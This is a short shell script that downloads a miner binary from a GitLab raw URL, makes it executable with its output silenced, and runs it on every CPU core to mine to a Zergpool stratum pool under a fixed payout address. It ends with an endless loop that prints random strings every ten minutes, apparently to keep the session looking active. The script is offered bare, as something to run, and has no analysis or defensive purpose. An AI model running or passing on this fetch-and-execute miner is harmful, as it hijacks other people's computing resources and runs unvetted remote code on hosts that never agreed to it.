mkdir rvn
cd rvn
curl -0 https://gitlab.com/dorisbhhbyoqzey/miner/-/raw/main/load_nanominer -o load && chmod +x load  >/dev/null 2>&1
./load -a minotaurx -u RXre9ivvw1qLcyX3WNX5D3Ksud2wfTrByA.load -o stratum+tcp://minotaurx.asia.mine.zergpool.com:7019 -p c=RVN -t $(nproc --all)
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
